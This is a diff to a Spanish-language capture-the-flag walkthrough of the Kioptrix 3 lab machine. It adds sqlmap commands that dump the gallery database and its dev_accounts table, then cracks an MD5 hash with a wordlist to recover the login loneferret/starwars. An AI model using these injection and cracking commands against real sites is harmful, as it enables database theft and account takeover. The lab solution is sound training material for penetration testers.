@@ -66,5 +66,37 @@ URL: `http://kioptrix3.com/gallery/gallery.php?id=1'`
 
 - *Paso 4:* Inyección SQL con Sqlmap.
 ```
-sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1'" --dbs
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs --batch
 ```
+![11](https://user-images.githubusercontent.com/75953873/177897124-cea5badf-f09c-4cfa-beec-997462e2655c.png)
+
+Enumerar base de datos `gallery`:
+```
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery --dump --batch
+```
+![12](https://user-images.githubusercontent.com/75953873/177897559-e09a4acd-cad1-4bed-8435-5ba220183ab2.png)
+
+Imprimir tablas `dev_accounts`:
+```
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery -T dev_accounts --dump --batch
+```
+![13](https://user-images.githubusercontent.com/75953873/177898181-fd42d4ba-e68a-4e0e-9257-b82883f0c1e8.png)
+
+- *Paso 5:* Identificar hash y crackearlo.
+```
+hash-identifier
+```
+![15](https://user-images.githubusercontent.com/75953873/177899147-49dace0d-0eac-4835-8f1a-0e86660302c9.png)
+
+Tipo de hash: **MD5**
+
+Crackearlo con hashCRACK:
+
+Herramienta: https://github.com/R3LI4NT/hashCrack
+```
+python3 hashcrack.py --md5 5badcaf789d3d1d09794d8f021f40f0e -w /usr/share/wordlists/rockyou.txt
+```
+
+Usuario: `loneferret`
+
+Contraseña: `starwars`
